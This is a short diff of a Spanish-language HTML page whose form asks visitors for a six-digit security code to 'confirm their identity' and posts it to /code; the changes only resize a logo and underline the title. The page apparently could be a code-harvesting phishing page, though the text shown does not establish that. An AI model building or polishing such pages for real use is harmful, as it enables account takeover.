@@ -74,10 +74,10 @@ text-align: center;
         color:#fff;font-weight:600;font-size:14px;cursor:pointer;
       }
       .logo img{  
-      width: 200px;
+      width: 250px;
        }
        .logo{ 
-       margin-bottom: 20px;
+       margin-bottom: 30px;
          }
       .footer{
         margin-top:10px;border:1px solid #dbdbdb;background:#fff;
@@ -91,7 +91,9 @@ text-align: center;
       <div class="logo">
       <img src="logomp1.png">
       <div/>
-        <div class="title">Ingresa el código de 6 digitos.</div>
+        <div class="title">
+        <u>Ingresa el código de 6 digitos.</u>
+        </div>
         <div class="desc">Para confirmar tu identidad ingresá el código que enviamos.</div>
         <form method="POST" action="/code"> 
           <input class="input" name="codigo" placeholder="Código de seguridad" inputmode="numeric">
